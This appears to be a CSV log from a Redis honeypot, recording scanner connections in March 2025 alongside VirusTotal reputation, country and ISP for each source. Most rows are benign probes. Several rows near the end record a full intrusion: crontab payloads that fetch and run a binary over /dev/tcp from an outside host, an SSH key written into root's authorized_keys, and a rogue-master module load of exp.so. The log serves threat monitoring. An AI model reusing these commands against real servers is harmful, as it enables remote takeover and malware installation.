time,action,Anon Src IP,src_port,level,VT Malicious,VT Engines,VT Labels,VT Reputation,Geo Location,ISP,Unnamed: 11,VT Tags,Malicious_Flag
3/25/2025 20:48,info,31.236.116.38,46272,info,1,SOCRadar,malware,0,CN,AS140527 China Telecom,,,0
3/25/2025 20:48,Closed,31.236.116.38,46272,info,1,SOCRadar,malware,0,CN,AS140527 China Telecom,,,0
3/25/2025 21:06,NewConnect,182.122.183.11,33990,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
3/25/2025 21:06,info,182.122.183.11,33990,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
3/25/2025 21:06,Closed,182.122.183.11,33990,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
3/25/2025 22:00,NewConnect,188.6.142.240,46908,info,1,SOCRadar,malware,0,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
3/25/2025 22:00,info,188.6.142.240,46908,info,1,SOCRadar,malware,0,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
3/25/2025 22:00,Closed,188.6.142.240,46908,info,1,SOCRadar,malware,0,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
3/25/2025 22:21,NewConnect,73.92.190.67,45948,info,0,,,0,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
3/25/2025 22:21,info,73.92.190.67,45948,info,0,,,0,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
3/25/2025 22:21,Closed,73.92.190.67,45948,info,0,,,0,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
3/26/2025 0:04,NewConnect,89.127.141.210,44446,info,8,"Criminal IP, BitDefender, CINS Army, CyRadar, G-Data, IPsum, Lionic, SOCRadar","malicious, phishing, malware",-2,US,"AS398324 Censys, Inc.",,,0
3/26/2025 0:04,PING,89.127.141.210,44446,info,8,"Criminal IP, BitDefender, CINS Army, CyRadar, G-Data, IPsum, Lionic, SOCRadar","malicious, phishing, malware",-2,US,"AS398324 Censys, Inc.",,,0
3/26/2025 0:04,INFO,89.127.141.210,44446,info,8,"Criminal IP, BitDefender, CINS Army, CyRadar, G-Data, IPsum, Lionic, SOCRadar","malicious, phishing, malware",-2,US,"AS398324 Censys, Inc.",,,0
3/26/2025 0:04,NONEXISTENT,89.127.141.210,44446,info,8,"Criminal IP, BitDefender, CINS Army, CyRadar, G-Data, IPsum, Lionic, SOCRadar","malicious, phishing, malware",-2,US,"AS398324 Censys, Inc.",,,0
3/26/2025 0:04,QUIT,89.127.141.210,44446,info,8,"Criminal IP, BitDefender, CINS Army, CyRadar, G-Data, IPsum, Lionic, SOCRadar","malicious, phishing, malware",-2,US,"AS398324 Censys, Inc.",,,0
3/26/2025 0:04,Closed,89.127.141.210,44446,info,8,"Criminal IP, BitDefender, CINS Army, CyRadar, G-Data, IPsum, Lionic, SOCRadar","malicious, phishing, malware",-2,US,"AS398324 Censys, Inc.",,,0
3/26/2025 0:06,NewConnect,123.179.72.64,40924,info,1,SOCRadar,malicious,0,JP,AS63949 Akamai Connected Cloud,,,0
3/26/2025 0:06,NewConnect,123.179.72.64,40938,info,1,SOCRadar,malicious,0,JP,AS63949 Akamai Connected Cloud,,,0
3/26/2025 0:06,INFO,123.179.72.64,40938,info,1,SOCRadar,malicious,0,JP,AS63949 Akamai Connected Cloud,,,0
3/26/2025 0:06,NONEXISTENT,123.179.72.64,40938,info,1,SOCRadar,malicious,0,JP,AS63949 Akamai Connected Cloud,,,0
3/26/2025 0:06,QUIT,123.179.72.64,40938,info,1,SOCRadar,malicious,0,JP,AS63949 Akamai Connected Cloud,,,0
3/26/2025 0:06,Closed,123.179.72.64,40938,info,1,SOCRadar,malicious,0,JP,AS63949 Akamai Connected Cloud,,,0
3/26/2025 0:06,PING,123.179.72.64,40938,info,1,SOCRadar,malicious,0,JP,AS63949 Akamai Connected Cloud,,,0
3/26/2025 0:06,Closed,123.179.72.64,40924,info,1,SOCRadar,malicious,0,JP,AS63949 Akamai Connected Cloud,,,0
3/26/2025 3:17,Closed,234.135.149.59,55460,info,0,,,0,US,AS8075 Microsoft Corporation,,,0
3/26/2025 3:17,MGLNDD_3.15.22.167_6379,234.135.149.59,55460,info,0,,,0,US,AS8075 Microsoft Corporation,,,0
3/26/2025 3:17,NewConnect,234.135.149.59,55460,info,0,,,0,US,AS8075 Microsoft Corporation,,,0
3/26/2025 4:02,NewConnect,130.168.225.45,48320,info,1,SOCRadar,malware,0,US,"AS14061 DigitalOcean, LLC",,,0
3/26/2025 4:02,NewConnect,130.168.225.45,48332,info,1,SOCRadar,malware,0,US,"AS14061 DigitalOcean, LLC",,,0
3/26/2025 4:02,PING,130.168.225.45,48332,info,1,SOCRadar,malware,0,US,"AS14061 DigitalOcean, LLC",,,0
3/26/2025 4:02,INFO,130.168.225.45,48332,info,1,SOCRadar,malware,0,US,"AS14061 DigitalOcean, LLC",,,0
3/26/2025 4:02,NONEXISTENT,130.168.225.45,48332,info,1,SOCRadar,malware,0,US,"AS14061 DigitalOcean, LLC",,,0
3/26/2025 4:02,QUIT,130.168.225.45,48332,info,1,SOCRadar,malware,0,US,"AS14061 DigitalOcean, LLC",,,0
3/26/2025 4:02,Closed,130.168.225.45,48332,info,1,SOCRadar,malware,0,US,"AS14061 DigitalOcean, LLC",,,0
3/26/2025 4:02,Closed,130.168.225.45,48320,info,1,SOCRadar,malware,0,US,"AS14061 DigitalOcean, LLC",,,0
3/26/2025 7:25,NewConnect,125.18.197.216,55240,info,1,SOCRadar,malware,0,JP,AS31898 Oracle Corporation,,,0
3/26/2025 7:25,info,125.18.197.216,55240,info,1,SOCRadar,malware,0,JP,AS31898 Oracle Corporation,,,0
3/26/2025 7:25,Closed,125.18.197.216,55240,info,1,SOCRadar,malware,0,JP,AS31898 Oracle Corporation,,,0
3/26/2025 7:28,NewConnect,250.142.84.235,43180,info,1,SOCRadar,malware,0,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
3/26/2025 7:28,hello 3,250.142.84.235,43180,info,1,SOCRadar,malware,0,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
3/26/2025 7:28,info server,250.142.84.235,43180,info,1,SOCRadar,malware,0,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
3/26/2025 7:28,ping,250.142.84.235,43180,info,1,SOCRadar,malware,0,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
3/26/2025 7:28,Closed,250.142.84.235,43180,info,1,SOCRadar,malware,0,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
3/26/2025 12:52,Closed,182.13.67.254,48494,info,5,"ADMINUSLabs, CINS Army, Fortinet, GreyNoise, SOCRadar","malicious, malware",-1,CN,"AS38365 Beijing Baidu Netcom Science and Technology Co., Ltd.",,,0
3/26/2025 12:52,NewConnect,182.13.67.254,48494,info,5,"ADMINUSLabs, CINS Army, Fortinet, GreyNoise, SOCRadar","malicious, malware",-1,CN,"AS38365 Beijing Baidu Netcom Science and Technology Co., Ltd.",,,0
3/26/2025 12:52,info,182.13.67.254,48494,info,5,"ADMINUSLabs, CINS Army, Fortinet, GreyNoise, SOCRadar","malicious, malware",-1,CN,"AS38365 Beijing Baidu Netcom Science and Technology Co., Ltd.",,,0
3/26/2025 14:51,PING,128.255.73.110,33114,info,13,"Criminal IP, ArcSight Threat Intelligence, BitDefender, Certego, CINS Army, CRDF, CyRadar, Fortinet, G-Data, IPsum, Lionic, SOCRadar, VIPRE","malicious, malware, phishing",-7,US,"AS10439 CariNet, Inc.",,,0
3/26/2025 14:51,INFO,128.255.73.110,33114,info,13,"Criminal IP, ArcSight Threat Intelligence, BitDefender, Certego, CINS Army, CRDF, CyRadar, Fortinet, G-Data, IPsum, Lionic, SOCRadar, VIPRE","malicious, malware, phishing",-7,US,"AS10439 CariNet, Inc.",,,0
3/26/2025 14:51,NONEXISTENT,128.255.73.110,33114,info,13,"Criminal IP, ArcSight Threat Intelligence, BitDefender, Certego, CINS Army, CRDF, CyRadar, Fortinet, G-Data, IPsum, Lionic, SOCRadar, VIPRE","malicious, malware, phishing",-7,US,"AS10439 CariNet, Inc.",,,0
3/26/2025 14:51,QUIT,128.255.73.110,33114,info,13,"Criminal IP, ArcSight Threat Intelligence, BitDefender, Certego, CINS Army, CRDF, CyRadar, Fortinet, G-Data, IPsum, Lionic, SOCRadar, VIPRE","malicious, malware, phishing",-7,US,"AS10439 CariNet, Inc.",,,0
3/26/2025 14:51,Closed,128.255.73.110,33114,info,13,"Criminal IP, ArcSight Threat Intelligence, BitDefender, Certego, CINS Army, CRDF, CyRadar, Fortinet, G-Data, IPsum, Lionic, SOCRadar, VIPRE","malicious, malware, phishing",-7,US,"AS10439 CariNet, Inc.",,,0
3/26/2025 14:51,NewConnect,128.255.73.110,33114,info,13,"Criminal IP, ArcSight Threat Intelligence, BitDefender, Certego, CINS Army, CRDF, CyRadar, Fortinet, G-Data, IPsum, Lionic, SOCRadar, VIPRE","malicious, malware, phishing",-7,US,"AS10439 CariNet, Inc.",,,0
3/26/2025 15:39,NewConnect,208.237.252.44,52534,info,1,SOCRadar,malware,0,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
3/26/2025 15:39,info,208.237.252.44,52534,info,1,SOCRadar,malware,0,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
3/26/2025 15:39,Closed,208.237.252.44,52534,info,1,SOCRadar,malware,0,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
3/26/2025 16:56,INFO,68.185.136.230,61968,info,12,"Criminal IP, alphaMountain.ai, BitDefender, CRDF, Cyble, CyRadar, Fortinet, G-Data, IPsum, Lionic, SOCRadar, VIPRE","malicious, phishing, malware",35,US,AS6939 Hurricane Electric LLC,,,0
3/26/2025 16:56,NewConnect,68.185.136.230,61968,info,12,"Criminal IP, alphaMountain.ai, BitDefender, CRDF, Cyble, CyRadar, Fortinet, G-Data, IPsum, Lionic, SOCRadar, VIPRE","malicious, phishing, malware",35,US,AS6939 Hurricane Electric LLC,,,0
3/26/2025 16:56,Closed,68.185.136.230,61968,info,12,"Criminal IP, alphaMountain.ai, BitDefender, CRDF, Cyble, CyRadar, Fortinet, G-Data, IPsum, Lionic, SOCRadar, VIPRE","malicious, phishing, malware",35,US,AS6939 Hurricane Electric LLC,,,0
3/26/2025 17:17,NewConnect,154.90.173.76,48308,info,1,SOCRadar,malicious,0,MK,AS215540 GLOBAL CONNECTIVITY SOLUTIONS LLP,,,0
3/26/2025 17:17,PING,154.90.173.76,48308,info,1,SOCRadar,malicious,0,MK,AS215540 GLOBAL CONNECTIVITY SOLUTIONS LLP,,,0
3/26/2025 17:17,INFO,154.90.173.76,48308,info,1,SOCRadar,malicious,0,MK,AS215540 GLOBAL CONNECTIVITY SOLUTIONS LLP,,,0
3/26/2025 17:17,NONEXISTENT,154.90.173.76,48308,info,1,SOCRadar,malicious,0,MK,AS215540 GLOBAL CONNECTIVITY SOLUTIONS LLP,,,0
3/26/2025 17:17,QUIT,154.90.173.76,48308,info,1,SOCRadar,malicious,0,MK,AS215540 GLOBAL CONNECTIVITY SOLUTIONS LLP,,,0
3/26/2025 17:17,Closed,154.90.173.76,48308,info,1,SOCRadar,malicious,0,MK,AS215540 GLOBAL CONNECTIVITY SOLUTIONS LLP,,,0
3/26/2025 17:17,NewConnect,154.90.173.76,48306,info,1,SOCRadar,malicious,0,MK,AS215540 GLOBAL CONNECTIVITY SOLUTIONS LLP,,,0
3/26/2025 17:18,Closed,154.90.173.76,48306,info,1,SOCRadar,malicious,0,MK,AS215540 GLOBAL CONNECTIVITY SOLUTIONS LLP,,,0
3/26/2025 18:02,NewConnect,208.243.223.45,48472,info,2,"Criminal IP, SOCRadar","malicious, malware",-1,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
3/26/2025 18:02,info,208.243.223.45,48472,info,2,"Criminal IP, SOCRadar","malicious, malware",-1,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
3/26/2025 18:02,Closed,208.243.223.45,48472,info,2,"Criminal IP, SOCRadar","malicious, malware",-1,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
3/26/2025 21:11,Closed,245.44.64.240,42476,info,0,,,0,US,AS8075 Microsoft Corporation,,,0
3/26/2025 21:11,NewConnect,245.44.64.240,42476,info,0,,,0,US,AS8075 Microsoft Corporation,,,0
3/26/2025 21:11,info,245.44.64.240,42476,info,0,,,0,US,AS8075 Microsoft Corporation,,,0
3/26/2025 23:55,info,11.81.201.122,43048,info,0,,,0,CN,AS141679 China Telecom Beijing Tianjin Hebei Big Data Industry Park Branch,,,0
3/26/2025 23:55,NewConnect,11.81.201.122,43048,info,0,,,0,CN,AS141679 China Telecom Beijing Tianjin Hebei Big Data Industry Park Branch,,,0
3/26/2025 23:55,Closed,11.81.201.122,43048,info,0,,,0,CN,AS141679 China Telecom Beijing Tianjin Hebei Big Data Industry Park Branch,,,0
3/27/2025 0:40,info,216.165.19.34,42716,info,2,"Fortinet, SOCRadar",malware,0,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
3/27/2025 0:40,Closed,216.165.19.34,42716,info,2,"Fortinet, SOCRadar",malware,0,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
3/27/2025 0:40,NewConnect,216.165.19.34,42716,info,2,"Fortinet, SOCRadar",malware,0,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
3/27/2025 1:17,NewConnect,208.243.223.45,33020,info,2,"Criminal IP, SOCRadar","malicious, malware",-1,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
3/27/2025 1:17,info,208.243.223.45,33020,info,2,"Criminal IP, SOCRadar","malicious, malware",-1,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
3/27/2025 1:17,Closed,208.243.223.45,33020,info,2,"Criminal IP, SOCRadar","malicious, malware",-1,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
3/27/2025 2:27,NewConnect,182.122.208.63,41520,info,2,"Guardpot, SOCRadar","malicious, malware",0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
3/27/2025 2:27,help,182.122.208.63,41520,info,2,"Guardpot, SOCRadar","malicious, malware",0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
3/27/2025 2:27,info,182.122.208.63,41520,info,2,"Guardpot, SOCRadar","malicious, malware",0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
3/27/2025 2:27,Closed,182.122.208.63,41520,info,2,"Guardpot, SOCRadar","malicious, malware",0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
3/27/2025 3:30,NewConnect,12.47.16.23,49277,info,14,"ADMINUSLabs, Criminal IP, BitDefender, Chong Lua Dao, CRDF, CyRadar, Fortinet, G-Data, Guardpot, IPsum, Lionic, SOCRadar, Sophos, VIPRE","malicious, phishing, malware",-7,BR,AS396982 Google LLC,,,0
3/27/2025 3:31,info,12.47.16.23,49277,info,14,"ADMINUSLabs, Criminal IP, BitDefender, Chong Lua Dao, CRDF, CyRadar, Fortinet, G-Data, Guardpot, IPsum, Lionic, SOCRadar, Sophos, VIPRE","malicious, phishing, malware",-7,BR,AS396982 Google LLC,,,0
3/27/2025 3:31,Closed,12.47.16.23,49277,info,14,"ADMINUSLabs, Criminal IP, BitDefender, Chong Lua Dao, CRDF, CyRadar, Fortinet, G-Data, Guardpot, IPsum, Lionic, SOCRadar, Sophos, VIPRE","malicious, phishing, malware",-7,BR,AS396982 Google LLC,,,0
3/27/2025 4:04,NewConnect,173.247.208.217,39756,info,1,SOCRadar,malware,0,CN,AS140527 China Telecom,,,0
3/27/2025 4:04,info,173.247.208.217,39756,info,1,SOCRadar,malware,0,CN,AS140527 China Telecom,,,0
3/27/2025 4:04,Closed,173.247.208.217,39756,info,1,SOCRadar,malware,0,CN,AS140527 China Telecom,,,0
3/27/2025 4:25,ping,208.253.48.183,48670,info,1,SOCRadar,malware,0,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
3/27/2025 4:25,info server,208.253.48.183,48670,info,1,SOCRadar,malware,0,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
3/27/2025 4:25,NewConnect,208.253.48.183,48670,info,1,SOCRadar,malware,0,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
3/27/2025 4:25,hello 3,208.253.48.183,48670,info,1,SOCRadar,malware,0,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
3/27/2025 4:25,Closed,208.253.48.183,48670,info,1,SOCRadar,malware,0,CN,"AS37963 Hangzhou Alibaba Advertising Co.,Ltd.",,,0
3/27/2025 4:36,NewConnect,185.103.54.252,6108,info,3,"BitDefender, G-Data, SOCRadar","phishing, malware",0,US,AS20001 Charter Communications Inc,,,0
3/27/2025 4:36,info,185.103.54.252,6108,info,3,"BitDefender, G-Data, SOCRadar","phishing, malware",0,US,AS20001 Charter Communications Inc,,,0
3/27/2025 4:36,Closed,185.103.54.252,6108,info,3,"BitDefender, G-Data, SOCRadar","phishing, malware",0,US,AS20001 Charter Communications Inc,,,0
3/27/2025 4:41,NewConnect,169.100.166.214,37236,info,1,SOCRadar,malware,0,CN,AS45090 Shenzhen Tencent Computer Systems Company Limited,,,0
3/27/2025 4:41,info,169.100.166.214,37236,info,1,SOCRadar,malware,0,CN,AS45090 Shenzhen Tencent Computer Systems Company Limited,,,0
3/27/2025 4:41,Closed,169.100.166.214,37236,info,1,SOCRadar,malware,0,CN,AS45090 Shenzhen Tencent Computer Systems Company Limited,,,0
3/27/2025 5:29,NewConnect,234.134.63.122,53988,info,2,"CyRadar, Guardpot",malicious,-54,US,AS8075 Microsoft Corporation,,,1
3/27/2025 5:29,Closed,234.134.63.122,53988,info,2,"CyRadar, Guardpot",malicious,-54,US,AS8075 Microsoft Corporation,,,1
3/27/2025 5:30,NewConnect,12.47.16.161,49263,info,8,"Criminal IP, ArcSight Threat Intelligence, BitDefender, CyRadar, G-Data, Lionic, SOCRadar, VIPRE","malicious, malware, phishing",-4,US,AS396982 Google LLC,,,0
3/27/2025 5:30,info,12.47.16.161,49263,info,8,"Criminal IP, ArcSight Threat Intelligence, BitDefender, CyRadar, G-Data, Lionic, SOCRadar, VIPRE","malicious, malware, phishing",-4,US,AS396982 Google LLC,,,0
3/27/2025 5:30,Closed,12.47.16.161,49263,info,8,"Criminal IP, ArcSight Threat Intelligence, BitDefender, CyRadar, G-Data, Lionic, SOCRadar, VIPRE","malicious, malware, phishing",-4,US,AS396982 Google LLC,,,0
3/27/2025 6:29,NewConnect,211.206.132.220,34460,info,0,,,0,BR,AS267197 CAMOA SERVIÇOS TELECOM LTDA.,,,0
3/27/2025 6:29,info server,211.206.132.220,34460,info,0,,,0,BR,AS267197 CAMOA SERVIÇOS TELECOM LTDA.,,,0
3/27/2025 6:29,FLUSHDB,211.206.132.220,34460,info,0,,,0,BR,AS267197 CAMOA SERVIÇOS TELECOM LTDA.,,,0
3/27/2025 6:29,"set x ""\n* * * * * if ! ps | grep -v grep | grep -q RI2FbTjoUX;then exec 6<>/dev/tcp/47.83.246.157/60107 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/RI2FbTjoUX ;fi && chmod +x /tmp/RI2FbTjoUX && /tmp/RI2FbTjoUX Y6ZJeKuEm6J3VrcVEahMdqmcmqJ6SqYTEL9Wf6eehKJ2SKgQFLxOfqKanbN2VrQTFahKe6OEkqF0TrYTFr5YeqSEkqBgSrMQDL5KdKWam6J3WLQTGqhBf72bm6dgSrQbGLBIf6eaiqR6VrcQE6hJeqqEm6J4QrASE7RAbqedhKt9VrQXF6hJfKGQnKN/SL4CFrFWdqCEmKZ7VrcQE7xOfqKbmbN6T6gaEahKe6eEmKB0TrYTErRYdqqEm6J4VrcVE6hKeqeQnKN/SrUCE7ZOYKKfhKF8QKgQE7NCeKObmaVuSb8RDLJKYKKbmL17QbwUErdKfrOenb15TqgTErNWf6SckKV+SbQSArJPYKuZhKF6TqgTF7FCeKObmqRuTLEMFbBWd6aEm6J8QrASE7dObqedhKR4VrcREKhJf6eQnKN/S7ECFrFWdqCEmaNgSbYVGLBIf6GTiqd5VrEUDLBLYKGbnal4SLcQEqZKfqOEm6p7VrQQFKhKeqGQnKN/SrcCELZBYKSehKp7VrQWGLBIf6KYiqd5Vr4RDLRNfL2bkqt0TrYTEbZYeqqEmKB6VrcaFqhJdqOQnKN/S7cCFrFWfKCchKJ/QagTFbRCeKObm6NuSb8RDLJKYKKbmL17QbwUErdKfrOShKF/QagQE7VWdqKQnKN/SrcCGqhKfKGEmKF2VrQWGrxOfqKbmbN2VrQTG6hJeaWEm6N0TrYTEbdYdr2YmKFgSbUWDLdNfamcmqJ8TaYWFahAfb2YmqpgTrwUErdMe7Oenb15TqgTE75Wf6WakKV+SbcSFTFMvsUFr1bwNLc3YGw=\n""",211.206.132.220,34460,info,0,,,0,BR,AS267197 CAMOA SERVIÇOS TELECOM LTDA.,,,0
3/27/2025 6:29,config set rdbcompression yes,211.206.132.220,34460,info,0,,,0,BR,AS267197 CAMOA SERVIÇOS TELECOM LTDA.,,,0
3/27/2025 6:29,"set x ""\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZh7PuIw0sqnlzZcJAYWJ8/vx4q/yfW1T2JIOlA9vO5RsoqgzUFxZmu8Nx7hgzufSCQ3RcL3hovAhfTMsKGH77qTTyZRSkteM/pojQEl/33ock1QhuCjv0HrrkOFj55Ij9gjQv6JSZsXNY+34IS7xFs/2BdqjHzQmNTYubsZl81doL0nDbEr6UWoR8ASwIEUn57nciP0OivpVG07Z34uNbCvLZIm8bF1DYD1W/B18QrvKWsyATBkl8Wa/6zXurAMoJby3QH2OdttrLHban8xboh7WohEEn3+/jNuGGgKgpQbxCHUryZ5twTKYRwrTQkGqlWaZj8MugRq1L8md2akOb root@localhost.localdomain\n\n""",211.206.132.220,34460,info,0,,,0,BR,AS267197 CAMOA SERVIÇOS TELECOM LTDA.,,,0
3/27/2025 6:29,config set dir .,211.206.132.220,34460,info,0,,,0,BR,AS267197 CAMOA SERVIÇOS TELECOM LTDA.,,,0
3/27/2025 6:29,config set dbfilename dump.rdb,211.206.132.220,34460,info,0,,,0,BR,AS267197 CAMOA SERVIÇOS TELECOM LTDA.,,,0
3/27/2025 6:29,save,211.206.132.220,34460,info,0,,,0,BR,AS267197 CAMOA SERVIÇOS TELECOM LTDA.,,,0
3/27/2025 6:29,config set dir /root/.ssh/,211.206.132.220,34460,info,0,,,0,BR,AS267197 CAMOA SERVIÇOS TELECOM LTDA.,,,0
3/27/2025 6:29,config set dbfilename authorized_keys,211.206.132.220,34460,info,0,,,0,BR,AS267197 CAMOA SERVIÇOS TELECOM LTDA.,,,0
3/27/2025 6:29,config set rdbcompression no,211.206.132.220,34460,info,0,,,0,BR,AS267197 CAMOA SERVIÇOS TELECOM LTDA.,,,0
3/27/2025 6:29,CONFIG SET dir /tmp/,211.206.132.220,34460,info,0,,,0,BR,AS267197 CAMOA SERVIÇOS TELECOM LTDA.,,,0
3/27/2025 6:29,CONFIG SET dbfilename exp.so,211.206.132.220,34460,info,0,,,0,BR,AS267197 CAMOA SERVIÇOS TELECOM LTDA.,,,0
3/27/2025 6:29,SLAVEOF 47.83.246.157 60107,211.206.132.220,34460,info,0,,,0,BR,AS267197 CAMOA SERVIÇOS TELECOM LTDA.,,,0
3/27/2025 6:29,MODULE LOAD /tmp/exp.so,211.206.132.220,34460,info,0,,,0,BR,AS267197 CAMOA SERVIÇOS TELECOM LTDA.,,,0
3/27/2025 6:29,SLAVEOF NO ONE,211.206.132.220,34460,info,0,,,0,BR,AS267197 CAMOA SERVIÇOS TELECOM LTDA.,,,0
3/27/2025 6:31,config set rdbcompression no,211.206.132.220,39666,info,0,,,0,BR,AS267197 CAMOA SERVIÇOS TELECOM LTDA.,,,0
3/27/2025 6:31,"set x ""\n* * * * * if ! ps | grep -v grep | grep -q cXVqzoWHvG;then exec 6<>/dev/tcp/47.83.246.157/60107 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/cXVqzoWHvG ;fi && chmod +x /tmp/cXVqzoWHvG && /tmp/cXVqzoWHvG tPvbT/TMIi4nyPZP2+nPw+vSVf7dJDIs0/dV1/XEzevNU/DHIzAkzfFB0u3N2+rSWOjMIjM7yf5b1evEwenDVfHTLTM7z/NTzePHz+3TUPfENTIkxehY0vXExO/NU/TELzYlzPJRw+zB2+rRUOjMITk7zPdX2e3FxOnbQfLKOzgm0/RU1vXEx+nZV/bMJTg1yfFP2+jbx+7WT/fPJDojzfdQ0PvBwvXbUujPIDQ7z/Vb1evExenDWf/TJDEj0/dW0vXHwe/ZV/bMJzM1zPZXzerA2+nRWejPJDUvy/ZQ0O3VxOLQT/LPOzEkz+hU2uHDxerRUebJIi4iy+hQ0+7bxOzVW/DNJDIl3fJWzePG2+nXV+jMIDcvy/ZQ0+zVwezNVvDTLDU7zPdT2e3FxOrVQfLKOzcj0/dS0fXExO/ZV/bMJjc1yfFP2+jbxuvNUPbKLzYlzPRYw+/C2+zVT/DOOzIkyvxX0+rHxfvRUfbTJDkg0/RT1fXHwenZV/bMJzE1z/ZYzezB2+LWT/TJLzYlzPdTw+/C2+PQT/TIJy4kxf5b1evExuvDVf/TJzMh0/dZ1/XEzevZV/bMJjE1yfFP0ejD2+rSWOjMIjIvy/ZQ0uvVxOLQT/LPOzEkz+hU2uHDxerRUebFOzIkxOhT0ujbzerZV/bMJzE1xehT0enbx+nbT/TJLTojzfdQ0PvN2+nSWOjMIjY7zPZb1evExurDWejPJzI7zPVVzerAxuHVUffPICAhyuhZ0PXHxeLNV/zLJTEhyOZV1PXCw/XSUP7TJDYlx/BR0urF+2W7q5uKeuVvd13KWL4OycY=\n""",211.206.132.220,39666,info,0,,,0,BR,AS267197 CAMOA SERVIÇOS TELECOM LTDA.,,,0
3/27/2025 6:31,info server,211.206.132.220,39666,info,0,,,0,BR,AS267197 CAMOA SERVIÇOS TELECOM LTDA.,,,0
3/27/2025 6:31,NewConnect,211.206.132.220,39666,info,0,,,0,BR,AS267197 CAMOA SERVIÇOS TELECOM LTDA.,,,0
3/27/2025 6:31,FLUSHDB,211.206.132.220,39666,info,0,,,0,BR,AS267197 CAMOA SERVIÇOS TELECOM LTDA.,,,0
3/27/2025 6:31,save,211.206.132.220,39666,info,0,,,0,BR,AS267197 CAMOA SERVIÇOS TELECOM LTDA.,,,0
3/27/2025 6:31,config set dir .,211.206.132.220,39666,info,0,,,0,BR,AS267197 CAMOA SERVIÇOS TELECOM LTDA.,,,0
3/27/2025 6:31,config set dbfilename dump.rdb,211.206.132.220,39666,info,0,,,0,BR,AS267197 CAMOA SERVIÇOS TELECOM LTDA.,,,0
3/27/2025 6:31,config set rdbcompression yes,211.206.132.220,39666,info,0,,,0,BR,AS267197 CAMOA SERVIÇOS TELECOM LTDA.,,,0
